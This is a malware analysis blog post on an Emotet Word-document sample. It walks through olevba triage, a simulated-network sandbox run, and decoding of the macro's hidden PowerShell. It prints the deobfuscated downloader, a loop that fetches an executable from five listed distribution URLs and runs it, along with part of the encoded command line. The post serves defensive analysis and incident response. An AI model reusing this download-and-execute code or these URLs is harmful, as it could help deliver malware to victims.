<!doctype html><html lang=en dir=ltr><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Emotet | Lux-Sit</title><meta name=generator content="Hugo Eureka 0.9.3"><link rel=stylesheet href=https://alpharivs.github.io/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css><script defer src=https://alpharivs.github.io/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js></script>
<link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=stylesheet href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css media=print onload='this.media="all",this.onload=null' crossorigin><script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/cpp.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/c.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/vbscript.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/powershell.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/http.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/x86asm.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/go.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/javascript.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/ruby.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/php.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/shell.min.js crossorigin></script>
<link rel=stylesheet href=https://alpharivs.github.io/css/highlightjs.min.2958991528e43eb6fc9b8c4f2b8e052f79c4010718e1d1e888a777620e9ee63021c2c57ec7417a3108019bb8c41943e6.css media=print onload='this.media="all",this.onload=null'><script defer type=text/javascript src=https://alpharivs.github.io/js/fontawesome.min.5326b5f9c61e2373bd99194e0e41377b1e5e42801f5fc0f2a11fe5ac898837b5e0e86b52e854fc435c595e22ec6a61b1.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ media=print onload='this.media="all",this.onload=null' crossorigin><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script defer src=https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js integrity=sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0 crossorigin></script>
<link rel=icon type=image/png sizes=32x32 href=https://alpharivs.github.io/images/icon_hu4bae09c78eba04c5e7d71d1040233379_73006_32x32_fill_q75_box_center.jpg><link rel=apple-touch-icon sizes=180x180 href=https://alpharivs.github.io/images/icon_hu4bae09c78eba04c5e7d71d1040233379_73006_180x180_fill_q75_box_center.jpg><meta name=description content="Word Macro Downloader Analysis and Extraction."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://alpharivs.github.io/malware/"},{"@type":"ListItem","position":2,"name":"Emotet","item":"https://alpharivs.github.io/malware/emotet/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://alpharivs.github.io/malware/emotet/"},"headline":"Emotet | Lux-Sit","image":"https://alpharivs.github.io/images/malware/emotet.webp","datePublished":"2023-02-03T00:00:00+00:00","dateModified":"2023-02-03T00:00:00+00:00","wordCount":1093,"author":{"@type":"Person","name":"Alpharivs"},"publisher":{"@type":"Person","name":"WANG Chucheng","logo":{"@type":"ImageObject","url":"https://alpharivs.github.io/images/icon.jpg"}},"description":"Word Macro Downloader Analysis and Extraction."}</script><meta property="og:title" content="Emotet | Lux-Sit"><meta property="og:type" content="article"><meta property="og:image" content="https://alpharivs.github.io/images/icon.jpg"><meta property="og:url" content="https://alpharivs.github.io/malware/emotet/"><meta property="og:description" content="Word Macro Downloader Analysis and Extraction."><meta property="og:locale" content="en"><meta property="og:site_name" content="Lux-Sit"><meta property="article:published_time" content="2023-02-03T00:00:00+00:00"><meta property="article:modified_time" content="2023-02-03T00:00:00+00:00"><meta property="article:section" content="malware"><meta property="article:tag" content="malware"><meta property="article:tag" content="analysis"><meta property="article:tag" content="static"><meta property="article:tag" content="dynamic"><meta property="article:tag" content="downloader"><meta property="article:tag" content="emotet"><meta property="og:see_also" content="https://alpharivs.github.io/malware/wannacry/launcher/"><meta property="og:see_also" content="https://alpharivs.github.io/malware/wannacry/dropper/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/challenge_teight/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/darn_mice/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/magic_8_ball/"><meta property="og:see_also" content="https://alpharivs.github.io/writeups/flare_flaredle/"><body class="flex min-h-screen flex-col"><header class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"><div class="mx-auto w-full max-w-screen-xl"><script>let storageColorScheme=localStorage.getItem("lightDarkMode");((storageColorScheme=="Auto"||storageColorScheme==null)&&window.matchMedia("(prefers-color-scheme: dark)").matches||storageColorScheme=="Dark")&&document.getElementsByTagName("html")[0].classList.add("dark")</script><nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0"><a href=/ class="me-6 text-primary-text text-xl font-bold">Lux-Sit</a>
<button id=navbar-btn class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
<i class="fas fa-bars"></i></button><div id=target class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20"><div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0"><a href=/malware/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 selected-menu-item me-4">Malware Analysis</a>
<a href=/writeups/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">CTF Write-ups</a>
<a href=/htb_writeups/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">HacktheBox Write-ups</a></div><div class=flex><div class="relative pt-4 md:pt-0"><div class="cursor-pointer hover:text-eureka" id=lightDarkMode><i class="fas fa-adjust"></i></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id=is-open></div><div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40" id=lightDarkOptions><span class="px-4 py-1 hover:text-eureka" name=Light>Light</span>
<span class="px-4 py-1 hover:text-eureka" name=Dark>Dark</span>
<span class="px-4 py-1 hover:text-eureka" name=Auto>Auto</span></div></div></div></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id=is-open-mobile></div></nav><script>let element=document.getElementById("lightDarkMode");storageColorScheme==null||storageColorScheme=="Auto"?document.addEventListener("DOMContentLoaded",()=>{window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",switchDarkMode)}):storageColorScheme=="Light"?(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","sun"),element.firstElementChild.classList.add("fa-sun")):storageColorScheme=="Dark"&&(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","moon"),element.firstElementChild.classList.add("fa-moon")),document.addEventListener("DOMContentLoaded",()=>{getcolorscheme(),switchBurger()})</script></div></header><main class="grow pt-16"><div class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8"><div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12"><div class="bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"><article class=prose><h1 class=mb-4>Emotet</h1><div class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"><div class="me-6 my-2"><i class="fas fa-calendar me-1"></i>
<span>2023-02-03</span></div><div class="me-6 my-2"><i class="fas fa-clock me-1"></i>
<span>6 min read</span></div><div class="me-6 my-2"><i class="fas fa-folder me-1"></i>
<a href=https://alpharivs.github.io/categories/malware/ class=hover:text-eureka>malware</a></div></div><img src=https://alpharivs.github.io/images/malware/emotet.webp class=w-full alt="Featured Image"><h2 id=introduction>Introduction</h2><p>Today we will do an analysis of the <a href=https://en.wikipedia.org/wiki/Emotet>Emotet</a> malware, out sample will be a <em>.doc</em> file that contains malicious <em><a href="https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/macro-malware?view=o365-worldwide">macros</a></em>, we will manually extract, decode and deobfuscate the malicious code and talk about multiple ways to perform this task.</p><h2 id=sample-details>Sample Details</h2><table><thead><tr><th>Hashes</th><th></th></tr></thead><tbody><tr><td>MD5</td><td>1d6f0e7e30c1d9e3f64b0d36e602da50</td></tr><tr><td>SHA-1</td><td>895d6dd7f677e45e997b03cef761fc40e10b22ba</td></tr><tr><td>SHA-256</td><td>70b4dbed87a8be890a088d70057ce44413bf3a65df5c5c15d049de0b9c47ff8d</td></tr></tbody></table><p>Detection Results:</p><p><img src=images/total.png alt=total></p><h2 id=tools-used>Tools Used</h2><pre><code class=language-text>- VirtualBox
- PEstudio
- HxD
- Procmon
- Process Hacker
- fakeDNS
- InetSim
- Wireshark
- Caffeine
</code></pre><h2 id=basic-static-analysis>Basic Static Analysis</h2><p>First we will do some basics checks by loading the document into pestudio to get the hash.
<img src=images/pestudio.png alt=pestudio></p><p>And then we will check the file signature with a hex editor to confirm that we are dealing with a word document.
<img src=images/hex.png alt=hex></p><p>The file signature <em>DO CF 11 E0</em> (I see what they did there) confirms that we are dealing with a <em>.doc</em> file which is defined as:</p><pre><code class=language-text>Compound File Binary Format, a container format defined by Microsoft COM. It can contain the equivalent of files and directories. It is used by Windows Installer and for documents in older versions of Microsoft Office.
</code></pre><p>Now that we know that we are dealing with a <em>.doc</em> file let&rsquo;s check for embedded macros using <em>oletools</em>.</p><pre><code class=language-bash>remnux@remnux:~/malware/emotet$ olevba REP_89419812646634117.doc
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|showwindow          |May hide the application                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
</code></pre><p><em>olevba</em> has not only found the macros, but it also gave us a neat summary of it&rsquo;s findings.</p><p>The main take that we get of the summary is that the file will attempt to execute a hidden obfuscated command when opened.</p><h2 id=dynamic-analysis>Dynamic Analysis</h2><p>Now we can start to dynamically analyze the file by opening it in a Windows VM and setting up <em>InetSim</em> and <em>FakeDNS</em> in our Remnux VM to intercept the traffic generated by the Windows VM.</p><p>When opening the <em>.doc</em> file in Microsoft Word it should be noted that we need to enable macros as they are disabled by default for security reasons.
<img src=images/macro.png alt=macro></p><h4 id=traffic-analysis-vm>Traffic Analysis VM.</h4><p>Immediately we receive DNS queries in our analysis VM.</p><p>There are 5 URLS being queried, that&rsquo;s a key element of the Emotet malware, there are <em>always</em> 5 URLS.</p><pre><code class=language-bash>remnux@remnux:~$ fakedns

...(SNIP)...

fakedns[INFO]: Response: amelano.net -&gt; 10.10.10.2
fakedns[INFO]: Response: 911concept.com -&gt; 10.10.10.2
fakedns[INFO]: Response: ayonschools.com -&gt; 10.10.10.2
fakedns[INFO]: Response: beech.org -&gt; 10.10.10.2
fakedns[INFO]: Response: firelabo.com -&gt; 10.10.10.2
</code></pre><p>InetSim reports that the infected machine is attempting to send HTTP GET requests to the domain names reported by FakeDNS.</p><pre><code class=language-bash>=== Report for session '2282' ===

Real start date            : 2023-02-03 13:15:05
Simulated start date       : 2023-02-03 13:15:05
Time difference on startup : none

2023-02-03 13:15:07  First simulated date in log file
2023-02-03 13:15:51  HTTP connection, method: GET, URL: http://amelano.net/wp-includes/css/dist/2ew/
2023-02-03 13:15:51  HTTP connection, method: GET, URL: http://911concept.com/images/i6ngX5/
2023-02-03 13:15:52  HTTP connection, method: GET, URL: http://ayonschools.com/UBkoqn/
2023-02-03 13:15:52  HTTP connection, method: GET, URL: http://beech.org/wayne/lldo/
2023-02-03 13:15:52  HTTP connection, method: GET, URL: http://firelabo.com/wp-includes/mf6f4/
</code></pre><h4 id=infected-vm>Infected VM.</h4><p>After loading and enabling the execution of macros in the infected machine <em>Process Hacker</em> shows that <em>powershell.exe</em> has been spawned.</p><p><img src=images/process.png alt=process></p><p>With that knowledge we can use procmon&rsquo;s process tree (CTRL+T) to find the spawned powershell process.</p><p><img src=images/procmon.png alt=procmon></p><p>Having found the powershell process we can see it&rsquo;s properties and get the command that it&rsquo;s running.</p><p><img src=images/cmdline.png alt=cmdline></p><h2 id=decoding>Decoding</h2><p>Know that we have the encoded powershell command we can load it in <em>cyberchef</em>, decode it and extract IOCs using the following filters.
<img src=images/cyber.png alt=cyber></p><p>The URLS found in the decoded powershell command are the same URLS that we caught in our traffic analysis VM.</p><pre><code class=language-bash>http://amelano.net/wp-includes/css/dist/2ew/
http://911concept.com/images/i6ngX5/
http://ayonschools.com/UBkoqn/
http://beech.org/wayne/lldo/
http://firelabo.com/wp-includes/mf6f4/
</code></pre><p>We can also take the decoded powershell command and with some patience manually deobfuscate it to see if there are more IOCs, which spoiler alert there are, and to get a clean version of the downloader&rsquo;s code.</p><pre><code class=language-powershell>Urls = 'http://amelano.net/wp-includes/css/dist/2ew/,
        http://911concept.com/images/i6ngX5/,
        http://ayonschools.com/UBkoqn/
        http://beech.org/wayne/lldo/
        http://firelabo.com/wp-includes/mf6f4/'

foreach($url in Urls ) 
{
    try {
        &amp;('new-object')net.webclient.downloadfile($urls, $env:userprofile+'\+267.exe')
    
        If ((.('Get-Item') $env:userprofile+'\+267.exe').Length -ge 25859) {
            [Diagnostics.Process]::START($env:userprofile+'\+267.exe')
            break
        }
    } 
    catch{
        
    }
}
</code></pre><p>The code not only confirms that there are 5 URLs that the malware attempts to reach, it also shows the name and location of the file that it&rsquo;s trying to fetch from those URLs that gives us more that to pass on to the incident response team.</p><pre><code class=language-bash># Attempts to download files to:
C:\users\$USERNAME\267.exe
</code></pre><h2 id=bonus-other-ways-of-extracting>Bonus: Other ways of extracting</h2><p>There are other multiple and more straight forward ways of extracting the powershell command that the malware runs, some of them are:</p><p>1 - Using the tool <em>vipermonkey</em> will extract the same command that we extracted with procmon without the need to use a Windows VM.</p><pre><code class=language-bash>remnux@remnux:~/malware/emotet$ vmonkey REP_89419812646634117.doc 

...(SNIP)...

Recorded Actions:
+-------------------+---------------------------+---------------------------+
| Action            | Parameters                | Description               |
+-------------------+---------------------------+---------------------------+
| Found Entry Point | document_open             |                           |
| GetObject         | ['winmgmtS:win32_Process' | Interesting Function Call |
|                   | ]                         |                           |
| GetObject         | ['winmgmtS:win32_ProcessS | Interesting Function Call |
|                   | tarvtP']                  |                           |
| Create            | ['Powershell -w hidden    | Interesting Function Call |
|                   | -en JABXAGgAaAB2AGQAeAByA |                           |
|                   | GIAcQB3AGwAawBmAD0AJwBBAG |                           |
|                   | 8AawBqAHMAdgBuAGcAcgBsAGs |                           |
|                   | AZABrACcAOwAkAEQAYQBiAHcA |                           |
|                   | ZwByAGwAcwBjAGIAbgB1AGQAI |                           |
|                   | AA9ACAAJwAyADYANwAnADsAJA |                           |
|                   | BXAGkAcwBhAGwAeABuAGcAeQB |                           |
|                   | tAHkAawA9ACcASABmAHIAZABh |                           |
|                   | AHoAagB1AG0AYwBqAGIAcAAnA |                           |
|                   | DsAJABQAHEAegBvAHEAeABzAG |                           |
...(SNIP)...
</code></pre><p>2 - Internet sandboxes like <em>anyrun</em> can also report the command that&rsquo;s being run and get the IOCs (although it&rsquo;s the most straightforward way of doing it some IOCs can actually be missed if not performing manual analysis).</p><p>3 - <em>Kahu Security&rsquo;s CMD Watcher</em> watches for the CMD, PowerShell and other processes, suspends it, extracts the command line data, then optionally kills it, making it also a great tool for extracting the powershell command without actually executing it, although it&rsquo;s still advised to use an isolated VM when attempting this route.</p><h2 id=conclusion>Conclusion</h2><p>With this we conclude this quick and fun analysis of the classic Emotet downloader. I hope that you enjoyed the post.</p><p>Stay safe and keep on hunting.</p><p>Lux-Sit</p></article><div class=my-4><a href=https://alpharivs.github.io/tags/malware/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#malware</a>
<a href=https://alpharivs.github.io/tags/analysis/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#analysis</a>
<a href=https://alpharivs.github.io/tags/static/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#static</a>
<a href=https://alpharivs.github.io/tags/dynamic/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#dynamic</a>
<a href=https://alpharivs.github.io/tags/downloader/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#downloader</a>
<a href=https://alpharivs.github.io/tags/emotet/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#emotet</a>
<a href=https://alpharivs.github.io/tags/word/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#word</a>
<a href=https://alpharivs.github.io/tags/document/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#document</a>
<a href=https://alpharivs.github.io/tags/powershell/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#powershell</a></div><div class=py-2><div class="my-8 flex flex-col items-center md:flex-row"><a href=https://alpharivs.github.io/authors/alpharivs/ class="md:me-4 text-primary-text h-24 w-24"><img src=https://alpharivs.github.io/images/profile.jpg class="bg-primary-bg w-full rounded-full" alt=Avatar></a><div class="mt-4 w-full md:mt-0 md:w-auto"><a href=https://alpharivs.github.io/authors/alpharivs/ class="mb-2 block border-b pb-1 text-lg font-bold"><h3>Alpharivs</h3></a><span class="block pb-2">Eternal Cybersecurity student with love for Malware and CTFs</span>
<a href=mailto:caliburn@tutanota.de class=me-2><i class="fas fa-envelope"></i></a>
<a href=https://twitter.com/alpharivs class=me-2><i class="fab fa-twitter"></i></a>
<a href=https://github.com/Alpharivs class=me-2><i class="fab fa-github"></i></a>
<a href=https://app.hackthebox.com/users/525385 class=me-2><i class="fab fa-jedi-order"></i></a></div></div></div><div class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"><div></div><div class="mt-4 md:mt-0 md:text-right"><span class="text-primary-text block font-bold">Next</span>
<a href=https://alpharivs.github.io/malware/wannacry/launcher/ class=block>Wannacry - Part 2</a></div></div></div><div class=col-span-2><div class="bg-primary-bg
prose sticky top-16 z-10 hidden px-6 py-4 lg:block"><h3>On This Page</h3></div><div class="sticky-toc hidden px-6 pb-6 lg:block"><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#sample-details>Sample Details</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#basic-static-analysis>Basic Static Analysis</a></li><li><a href=#dynamic-analysis>Dynamic Analysis</a><ul><li><ul><li><a href=#traffic-analysis-vm>Traffic Analysis VM.</a></li><li><a href=#infected-vm>Infected VM.</a></li></ul></li></ul></li><li><a href=#decoding>Decoding</a></li><li><a href=#bonus-other-ways-of-extracting>Bonus: Other ways of extracting</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div><script>window.addEventListener("DOMContentLoaded",()=>{enableStickyToc()})</script></div><div class="bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"><h3>See Also</h3><a href=https://alpharivs.github.io/malware/wannacry/launcher/ class=no-underline>Wannacry - Part 2</a><br><a href=https://alpharivs.github.io/malware/wannacry/dropper/ class=no-underline>Wannacry - Part 1</a><br><a href=https://alpharivs.github.io/writeups/challenge_teight/ class=no-underline>Flare-On 2022 - T8</a><br><a href=https://alpharivs.github.io/writeups/darn_mice/ class=no-underline>Flare-On 2022 - darn_mice</a><br><a href=https://alpharivs.github.io/writeups/magic_8_ball/ class=no-underline>Flare-On 2022 - Magic 8 Ball</a><br><a href=https://alpharivs.github.io/writeups/flare_flaredle/ class=no-underline>Flare-On 2022 - Flaredle</a><br></div></div><script>document.addEventListener("DOMContentLoaded",()=>{hljs.highlightAll()})</script></div></div></main><footer class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b"><p class="text-sm text-tertiary-text">&copy; 2023 <a href=https://twitter.com/alpharivs>Alpharivs</a>
&#183; Powered by the <a href=https://github.com/wangchucheng/hugo-eureka class=hover:text-eureka>Eureka</a> theme for <a href=https://gohugo.io class=hover:text-eureka>Hugo</a></p></div></div></footer></body></html>